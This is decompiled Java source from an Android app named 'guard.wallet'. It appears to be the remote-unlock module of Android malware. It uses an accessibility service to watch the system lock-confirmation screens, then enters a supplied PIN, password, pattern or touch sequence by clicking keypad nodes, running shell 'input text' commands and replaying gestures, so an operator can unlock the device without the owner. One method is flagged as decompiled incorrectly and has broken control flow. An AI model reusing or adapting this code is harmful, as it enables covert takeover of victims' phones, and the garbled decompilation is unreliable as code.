package p012o;

import a1.AbstractC0026q;
import android.graphics.Rect;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.helper.AbstractC0178a;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.req.TouchEvent;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.thread.AbstractC0243l;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import p000a.AbstractC0000a;
import p005h.C0318e;

/* renamed from: o.i */
/* loaded from: classes.dex */
public final class C0420i extends C0416e {

    /* renamed from: n */
    public final String f900n;

    /* renamed from: o */
    public final ConcurrentLinkedQueue f901o;

    public C0420i() {
        super(m1117L(), "com.android.settings");
        this.f900n = null;
        this.f901o = new ConcurrentLinkedQueue();
        this.f900n = "com.android.settings";
    }

    /* renamed from: I */
    public static boolean m1116I(String str) {
        UiObject m560J;
        if (AbstractC0026q.m151B(str)) {
            str = (String) MyAccessibilityService.f326v.get();
        }
        if (!AbstractC0026q.m151B(str)) {
            if (Objects.equals(str, "com.android.settings.password.ConfirmLockPassword") || Objects.equals(str, "com.android.settings.password.ConfirmLockPattern") || Objects.equals(str, "com.android.settings.password.ChooseLockGeneric") || Objects.equals(str, "com.vivo.settings.password.ConfirmVivoPin$InternalActivity") || Objects.equals(str, "com.android.settings.password.ConfirmLockPattern$InternalActivity")) {
                return true;
            }
            return Objects.equals(str, "android.inputmethodservice.SoftInputWindow") && (m560J = MyAccessibilityService.m554P().m560J()) != null && m560J.password();
        }
        return false;
    }

    /* renamed from: L */
    public static LinkedList m1117L() {
        LinkedList linkedList = new LinkedList();
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.password.ConfirmLockPassword");
        AbstractC0413b.m1024r(listenWindow).add(32);
        listenWindow.getEventTypes().add(16384);
        linkedList.add(listenWindow);
        ListenWindow listenWindow2 = new ListenWindow("com.android.settings", "com.android.settings.password.ConfirmLockPattern");
        listenWindow2.setEventTypes(new HashSet<>());
        listenWindow2.getEventTypes().add(32);
        listenWindow2.getEventTypes().add(16384);
        linkedList.add(listenWindow2);
        ListenWindow listenWindow3 = new ListenWindow("com.android.settings", "com.android.settings.password.ChooseLockGeneric");
        listenWindow3.setEventTypes(new HashSet<>());
        listenWindow3.getEventTypes().add(32);
        listenWindow3.getEventTypes().add(16384);
        linkedList.add(listenWindow3);
        ListenWindow listenWindow4 = new ListenWindow("com.android.settings", "com.vivo.settings.password.ConfirmVivoPin$InternalActivity");
        listenWindow4.setEventTypes(new HashSet<>());
        listenWindow4.getEventTypes().add(32);
        listenWindow4.getEventTypes().add(16384);
        linkedList.add(listenWindow4);
        ListenWindow listenWindow5 = new ListenWindow("com.android.settings", "com.android.settings.password.ConfirmLockPattern$InternalActivity");
        listenWindow5.setEventTypes(new HashSet<>());
        listenWindow5.getEventTypes().add(32);
        listenWindow5.getEventTypes().add(16384);
        linkedList.add(listenWindow5);
        return linkedList;
    }

    /* renamed from: O */
    public static boolean m1118O() {
        return AbstractC0249e.m620i() || AbstractC0249e.m623l();
    }

    /* renamed from: P */
    public static void m1119P() {
        try {
            Thread.sleep(1 * 500);
        } catch (Exception e2) {
            AbstractC0026q.m186s("ConfirmLockDelegate", e2);
        }
    }

    /* renamed from: H */
    public final boolean m1120H() {
        AtomicInteger atomicInteger = new AtomicInteger(0);
        while (atomicInteger.incrementAndGet() < 20 && m1116I(null)) {
            try {
                Thread.sleep(100L);
            } catch (Exception e2) {
                AbstractC0026q.m186s("ConfirmLockDelegate", e2);
            }
        }
        return !m1116I(null);
    }

    /* renamed from: J */
    public final void m1121J() {
        if (MyAccessibilityService.m554P() == null || m1072k() == null || !AbstractC0249e.m623l()) {
            return;
        }
        UiObject m1072k = m1072k();
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.view.View"), "id");
        String str = this.f900n;
        m1008b.setEquals(str.concat(":id/mix_confirm"));
        combineFilter.getStringConditions().add(m1008b);
        UiObject findOneByCombine = m1072k.findOneByCombine(combineFilter);
        if (findOneByCombine == null || !findOneByCombine.click()) {
            UiObject m1072k2 = m1072k();
            CombineFilter combineFilter2 = new CombineFilter();
            StringCondition m1008b2 = AbstractC0413b.m1008b(combineFilter2, AbstractC0000a.m7c(combineFilter2, "className", "android.widget.TextView"), "id");
            m1008b2.setEquals(str.concat(":id/iv_complete"));
            combineFilter2.getStringConditions().add(m1008b2);
            UiObject findOneByCombine2 = m1072k2.findOneByCombine(combineFilter2);
            if (findOneByCombine2 == null || !findOneByCombine2.click()) {
                UiObject m1072k3 = m1072k();
                CombineFilter combineFilter3 = new CombineFilter();
                StringCondition m1008b3 = AbstractC0413b.m1008b(combineFilter3, AbstractC0000a.m7c(combineFilter3, "className", "android.widget.Button"), "id");
                m1008b3.setEquals(str.concat(":id/vivo_pin_confirm"));
                combineFilter3.getStringConditions().add(m1008b3);
                UiObject findOneByCombine3 = m1072k3.findOneByCombine(combineFilter3);
                if (findOneByCombine3 == null || !findOneByCombine3.click()) {
                    UiObject m1072k4 = m1072k();
                    CombineFilter combineFilter4 = new CombineFilter();
                    StringCondition m1008b4 = AbstractC0413b.m1008b(combineFilter4, AbstractC0000a.m7c(combineFilter4, "className", "android.widget.TextView"), "id");
                    m1008b4.setEquals(str.concat(":id/mix_normal_confirm"));
                    combineFilter4.getStringConditions().add(m1008b4);
                    UiObject findOneByCombine4 = m1072k4.findOneByCombine(combineFilter4);
                    if (findOneByCombine4 != null) {
                        findOneByCombine4.click();
                    }
                }
            }
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:205:0x0228, code lost:
    
        if (m1120H() != false) goto L144;
     */
    /* JADX WARN: Code restructure failed: missing block: B:206:0x033e, code lost:
    
        r1 = true;
     */
    /* JADX WARN: Code restructure failed: missing block: B:231:0x029c, code lost:
    
        if (m1120H() != false) goto L144;
     */
    /* JADX WARN: Code restructure failed: missing block: B:263:0x033c, code lost:
    
        if (r2 != false) goto L144;
     */
    /* JADX WARN: Code restructure failed: missing block: B:73:0x054a, code lost:
    
        if (m1120H() != false) goto L235;
     */
    /* JADX WARN: Code restructure failed: missing block: B:74:0x056d, code lost:
    
        r1 = true;
     */
    /* JADX WARN: Code restructure failed: missing block: B:84:0x056b, code lost:
    
        if (m1120H() != false) goto L235;
     */
    /* JADX WARN: Removed duplicated region for block: B:128:0x00c3 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:129:0x00c4  */
    /* JADX WARN: Removed duplicated region for block: B:208:0x03ce A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:27:0x0477 A[RETURN] */
    /* renamed from: K */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m1122K(ReqUnlockDeviceVO reqUnlockDeviceVO) {
        boolean z2;
        boolean z3;
        boolean z4;
        UiObjectCollection uiObjectCollection;
        UiObject uiObject;
        Rect rect;
        boolean z5;
        boolean equals = Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC_COMPLEX");
        String str = this.f900n;
        if (equals || Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_ALPHANUMERIC") || Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC") || Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")) {
            Log.d("ConfirmLockDelegate", "confirmLockByCipher");
            if (!AbstractC0026q.m151B(reqUnlockDeviceVO.getTextCipher())) {
                String textCipher = reqUnlockDeviceVO.getTextCipher();
                if (!AbstractC0026q.m151B(textCipher)) {
                    if (m1072k() != null) {
                        uiObject = m1072k().currentFocusedNode();
                    } else {
                        Log.d("ConfirmLockDelegate", "root is null");
                        uiObject = null;
                    }
                    if (uiObject == null) {
                        uiObject = MyAccessibilityService.m554P().m560J();
                    }
                    if (uiObject != null && Objects.equals(uiObject.className(), "android.widget.EditText")) {
                        if (C0318e.m844S() != null && C0318e.m844S().mo302D()) {
                            m1119P();
                            if (C0318e.m844S().m855N("input text ".concat(textCipher))) {
                                m1123M(null);
                                if (m1120H()) {
                                    z2 = true;
                                    if (z2) {
                                        return true;
                                    }
                                    String textCipher2 = reqUnlockDeviceVO.getTextCipher();
                                    String cipherGradeCode = reqUnlockDeviceVO.getCipherGradeCode();
                                    if (!AbstractC0026q.m151B(textCipher2) && MyAccessibilityService.m554P() != null) {
                                        Log.d("ConfirmLockDelegate", "confirmLockByNodes");
                                        if (Objects.equals(cipherGradeCode, "PASSWORD_QUALITY_NUMERIC_COMPLEX") || Objects.equals(cipherGradeCode, "PASSWORD_QUALITY_NUMERIC") || Objects.equals(cipherGradeCode, "PASSWORD_QUALITY_TOUCH_POINTS") || (Objects.equals(cipherGradeCode, "PASSWORD_QUALITY_ALPHANUMERIC") && AbstractC0026q.m153D(textCipher2))) {
                                            if (!AbstractC0026q.m151B(textCipher2) && MyAccessibilityService.m554P() != null && m1072k() != null) {
                                                Log.d("ConfirmLockDelegate", "confirmLockByPinKey");
                                                if (AbstractC0249e.m620i()) {
                                                    for (int i2 = 0; i2 < textCipher2.length(); i2++) {
                                                        String valueOf = String.valueOf(textCipher2.charAt(i2));
                                                        UiObject m1072k = m1072k();
                                                        CombineFilter combineFilter = new CombineFilter();
                                                        combineFilter.getStringConditions().add(AbstractC0000a.m6b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.view.View"), "desc", valueOf));
                                                        UiObject findOneByCombine = m1072k.findOneByCombine(combineFilter);
                                                        if (findOneByCombine != null && findOneByCombine.click()) {
                                                            Log.d("ConfirmLockDelegate", "Click Pin Node ID:" + valueOf);
                                                            m1119P();
                                                        }
                                                    }
                                                    m1121J();
                                                }
                                                if (AbstractC0249e.m623l()) {
                                                    Log.d("ConfirmLockDelegate", "confirmLockByVivoPinKey");
                                                    UiObject m1072k2 = m1072k();
                                                    CombineFilter combineFilter2 = new CombineFilter();
                                                    combineFilter2.setStringConditions(new LinkedList());
                                                    StringCondition stringCondition = new StringCondition();
                                                    stringCondition.setProperty("id");
                                                    stringCondition.setPrefix(str.concat(":id/four_to_more_key"));
                                                    combineFilter2.getStringConditions().add(stringCondition);
                                                    UiObjectCollection findByCombine = m1072k2.findByCombine(combineFilter2);
                                                    String concat = str.concat(":id/four_to_more_key");
                                                    if (findByCombine == null || findByCombine.size() <= 0) {
                                                        z4 = false;
                                                    } else {
                                                        for (int i3 = 0; i3 < textCipher2.length(); i3++) {
                                                            String concat2 = concat.concat(String.valueOf(textCipher2.charAt(i3)));
                                                            for (UiObject uiObject2 : findByCombine.getNodes()) {
                                                                if (uiObject2 != null && Objects.equals(uiObject2.id(), concat2) && uiObject2.click()) {
                                                                    Log.d("ConfirmLockDelegate", "Click Pin Node ID:" + concat2);
                                                                    m1119P();
                                                                }
                                                            }
                                                        }
                                                        m1121J();
                                                        z4 = m1120H();
                                                    }
                                                }
                                                String concat3 = str.concat(":id/key");
                                                UiObject m1072k3 = m1072k();
                                                CombineFilter combineFilter3 = new CombineFilter();
                                                StringCondition m1008b = AbstractC0413b.m1008b(combineFilter3, AbstractC0000a.m7c(combineFilter3, "className", "android.view.ViewGroup"), "id");
                                                m1008b.setPrefix(str.concat(":id/key"));
                                                combineFilter3.getStringConditions().add(m1008b);
                                                UiObjectCollection findByCombine2 = m1072k3.findByCombine(combineFilter3);
                                                if (findByCombine2 != null && findByCombine2.size() > 0) {
                                                    for (int i4 = 0; i4 < textCipher2.length(); i4++) {
                                                        String concat4 = concat3.concat(String.valueOf(textCipher2.charAt(i4)));
                                                        for (UiObject uiObject3 : findByCombine2.getNodes()) {
                                                            if (uiObject3 != null && Objects.equals(uiObject3.id(), concat4) && uiObject3.click()) {
                                                                Log.d("ConfirmLockDelegate", "Click Pin Node ID:" + concat4);
                                                                m1119P();
                                                            }
                                                        }
                                                    }
                                                    m1121J();
                                                    z3 = m1120H();
                                                }
                                            }
                                        } else if (Objects.equals(cipherGradeCode, "PASSWORD_QUALITY_ALPHANUMERIC") && !AbstractC0026q.m151B(textCipher2) && MyAccessibilityService.m554P() != null && m1072k() != null && AbstractC0249e.m623l()) {
                                            UiObject m1072k4 = m1072k();
                                            CombineFilter combineFilter4 = new CombineFilter();
                                            StringCondition m1008b2 = AbstractC0413b.m1008b(combineFilter4, AbstractC0000a.m7c(combineFilter4, "className", "android.widget.Button"), "id");
                                            m1008b2.setPrefix(str.concat(":id/num"));
                                            combineFilter4.getStringConditions().add(m1008b2);
                                            UiObjectCollection findByCombine3 = m1072k4.findByCombine(combineFilter4);
                                            UiObject m1072k5 = m1072k();
                                            CombineFilter combineFilter5 = new CombineFilter();
                                            StringCondition m1008b3 = AbstractC0413b.m1008b(combineFilter5, AbstractC0000a.m7c(combineFilter5, "className", "android.widget.Button"), "id");
                                            m1008b3.setPrefix(str.concat(":id/char_"));
                                            combineFilter5.getStringConditions().add(m1008b3);
                                            UiObjectCollection findByCombine4 = m1072k5.findByCombine(combineFilter5);
                                            if (findByCombine3 != null && findByCombine3.size() > 0 && findByCombine4 != null && findByCombine4.size() > 0) {
                                                int i5 = 0;
                                                while (i5 < textCipher2.length()) {
                                                    String valueOf2 = String.valueOf(textCipher2.charAt(i5));
                                                    if (AbstractC0026q.m153D(valueOf2)) {
                                                        String concat5 = str.concat(":id/num").concat(valueOf2);
                                                        for (UiObject uiObject4 : findByCombine3.getNodes()) {
                                                            if (uiObject4 != null) {
                                                                UiObjectCollection uiObjectCollection2 = findByCombine3;
                                                                if (Objects.equals(uiObject4.id(), concat5) && uiObject4.click()) {
                                                                    Log.d("ConfirmLockDelegate", "Click VIVO Num Node ID:" + concat5);
                                                                    m1119P();
                                                                }
                                                                findByCombine3 = uiObjectCollection2;
                                                            }
                                                        }
                                                        uiObjectCollection = findByCombine3;
                                                    } else {
                                                        uiObjectCollection = findByCombine3;
                                                        String concat6 = str.concat(":id/char_").concat(valueOf2);
                                                        for (UiObject uiObject5 : findByCombine4.getNodes()) {
                                                            if (uiObject5 != null && Objects.equals(uiObject5.id(), concat6) && uiObject5.click()) {
                                                                Log.d("ConfirmLockDelegate", "Click VIVO Char Node ID:" + concat6);
                                                                m1119P();
                                                            }
                                                        }
                                                    }
                                                    i5++;
                                                    findByCombine3 = uiObjectCollection;
                                                }
                                                m1121J();
                                            }
                                        }
                                        if (z3) {
                                            return true;
                                        }
                                    }
                                    z3 = false;
                                    if (z3) {
                                    }
                                }
                            }
                        }
                        if (uiObject.setText(textCipher)) {
                            m1123M(uiObject);
                            z2 = m1120H();
                            if (z2) {
                            }
                        }
                    }
                }
                z2 = false;
                if (z2) {
                }
            }
        }
        if (Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN")) {
            List<Point> patternCipher = reqUnlockDeviceVO.getPatternCipher();
            Rect boundsInScreen = reqUnlockDeviceVO.getBoundsInScreen();
            Rect boundsInParent = reqUnlockDeviceVO.getBoundsInParent();
            if (patternCipher != null && !patternCipher.isEmpty()) {
                LinkedList linkedList = new LinkedList(patternCipher);
                AbstractC0178a.m342d(linkedList);
                if (m1072k() != null && MyAccessibilityService.m554P() != null) {
                    AbstractC0251g.T0(10);
                    UiObject m1072k6 = m1072k();
                    CombineFilter combineFilter6 = new CombineFilter();
                    StringCondition m1008b4 = AbstractC0413b.m1008b(combineFilter6, AbstractC0000a.m7c(combineFilter6, "className", "android.view.View"), "id");
                    m1008b4.setEquals(str.concat(":id/lockPattern"));
                    combineFilter6.getStringConditions().add(m1008b4);
                    UiObject findOneByCombine2 = m1072k6.findOneByCombine(combineFilter6);
                    if (findOneByCombine2 != null) {
                        Log.d("ConfirmLockDelegate", "confirmLockByGesture pattern:" + findOneByCombine2);
                        if (!AbstractC0249e.m623l()) {
                            LinkedList linkedList2 = (LinkedList) AbstractC0178a.m343e(linkedList, boundsInScreen, boundsInParent, findOneByCombine2.boundsInWindow(), findOneByCombine2.boundsInParent());
                            Point[] pointArr = new Point[linkedList2.size()];
                            linkedList2.toArray(pointArr);
                            if (m1124N(pointArr)) {
                                z5 = true;
                                if (z5) {
                                    return true;
                                }
                            }
                        }
                        Point[] pointArr2 = new Point[linkedList.size()];
                        linkedList.toArray(pointArr2);
                        z5 = m1124N(pointArr2);
                        if (z5) {
                        }
                    }
                }
            }
            z5 = false;
            if (z5) {
            }
        }
        if (reqUnlockDeviceVO.getTouchCipher() != null && !reqUnlockDeviceVO.getTouchCipher().isEmpty()) {
            List<Point> touchCipher = reqUnlockDeviceVO.getTouchCipher();
            Rect boundsInScreen2 = reqUnlockDeviceVO.getBoundsInScreen();
            reqUnlockDeviceVO.getBoundsInParent();
            if (touchCipher != null && !touchCipher.isEmpty()) {
                if (m1072k() != null && MyAccessibilityService.m554P() != null) {
                    UiObject m1072k7 = m1072k();
                    CombineFilter combineFilter7 = new CombineFilter();
                    StringCondition m1008b5 = AbstractC0413b.m1008b(combineFilter7, AbstractC0000a.m7c(combineFilter7, "className", "android.view.View"), "id");
                    m1008b5.setEquals(str.concat(":id/keyboard_num"));
                    combineFilter7.getStringConditions().add(m1008b5);
                    UiObject findOneByCombine3 = m1072k7.findOneByCombine(combineFilter7);
                    if (findOneByCombine3 != null) {
                        Rect boundsInWindow = findOneByCombine3.boundsInWindow();
                        if (boundsInScreen2 != null && boundsInWindow != null) {
                            HashMap m340b = AbstractC0178a.m340b(boundsInScreen2);
                            HashMap m340b2 = AbstractC0178a.m340b(boundsInWindow);
                            if (!touchCipher.isEmpty()) {
                                ListIterator<Point> listIterator = touchCipher.listIterator();
                                while (listIterator.hasNext()) {
                                    Point next = listIterator.next();
                                    Iterator it = m340b.entrySet().iterator();
                                    while (true) {
                                        if (it.hasNext()) {
                                            Map.Entry entry = (Map.Entry) it.next();
                                            if (((Rect) entry.getValue()).contains((int) next.getX(), (int) next.getY()) && (rect = (Rect) m340b2.get(entry.getKey())) != null) {
                                                next.setX(rect.centerX());
                                                next.setY(rect.centerY());
                                                break;
                                            }
                                        }
                                    }
                                    listIterator.set(next);
                                }
                            }
                        }
                    }
                    if (AbstractC0251g.m673t(touchCipher)) {
                    }
                }
                if (C0318e.m844S() != null) {
                    if (C0318e.m844S().mo302D()) {
                        if (C0318e.m844S().c0(touchCipher)) {
                        }
                    }
                }
            }
            boolean z6 = false;
            if (z6) {
                return true;
            }
        }
        if (!Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN") && !Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")) {
            return false;
        }
        List<TouchEvent> eventCipher = reqUnlockDeviceVO.getEventCipher();
        return eventCipher != null && !eventCipher.isEmpty() && C0318e.m844S() != null && C0318e.m844S().mo302D() && C0318e.m844S().b0(eventCipher) && m1120H();
    }

    /* renamed from: M */
    public final void m1123M(UiObject uiObject) {
        if (C0318e.m844S() != null && C0318e.m844S().mo302D() && C0318e.m844S().m855N("input keyevent 66")) {
            return;
        }
        if (uiObject == null && m1072k() != null) {
            uiObject = m1072k().currentFocusedNode();
        }
        if (uiObject == null && MyAccessibilityService.m554P() != null) {
            uiObject = MyAccessibilityService.m554P().m560J();
        }
        if (uiObject == null || Build.VERSION.SDK_INT < 30) {
            return;
        }
        uiObject.enter();
    }

    /* renamed from: N */
    public final boolean m1124N(Point[] pointArr) {
        if (pointArr.length > 0) {
            for (int i2 = 1; i2 <= 4; i2++) {
                long j2 = i2 * 1000;
                try {
                    CountDownLatch countDownLatch = new CountDownLatch(1);
                    if (AbstractC0251g.m646S(10L, Long.valueOf(j2), pointArr)) {
                        if (!countDownLatch.await(j2 + 1000, TimeUnit.MILLISECONDS)) {
                            Log.d("ConfirmLockDelegate", "ResolveGesture Done");
                        }
                        if (m1120H()) {
                            return true;
                        }
                    }
                } catch (Exception e2) {
                    AbstractC0026q.m186s("ConfirmLockDelegate", e2);
                }
            }
        }
        return m1120H();
    }

    @Override // p012o.C0416e
    /* renamed from: d */
    public final void mo1001d() {
        try {
            AbstractC0243l.m591a(this.f864c);
            this.f901o.clear();
            super.mo1001d();
        } catch (Exception e2) {
            AbstractC0026q.m186s("ConfirmLockDelegate", e2);
        }
    }

    @Override // p012o.C0416e
    public final boolean equals(Object obj) {
        if (this == obj) {
            return true;
        }
        if (obj != null && (obj instanceof C0420i)) {
            return Objects.equals(this.f900n, ((C0420i) obj).f900n);
        }
        return false;
    }

    @Override // p012o.C0416e
    public final int hashCode() {
        return Objects.hash(C0420i.class.getName(), this.f900n);
    }

    @Override // p012o.C0416e
    /* renamed from: u */
    public final void mo1002u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        super.mo1002u(accessibilityEvent, str, str2);
        Log.d("ConfirmLockDelegate", "onAccessibilityEvent event：" + accessibilityEvent);
        if (m1116I(str2)) {
            Log.d("ConfirmLockDelegate", "已进入锁屏密码验证代理");
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f901o;
            if (concurrentLinkedQueue.contains("inConfirmLock")) {
                return;
            }
            concurrentLinkedQueue.add("inConfirmLock");
            AbstractC0243l.m593c(new RunnableC0412a(this, 1), this.f864c);
        }
    }
}
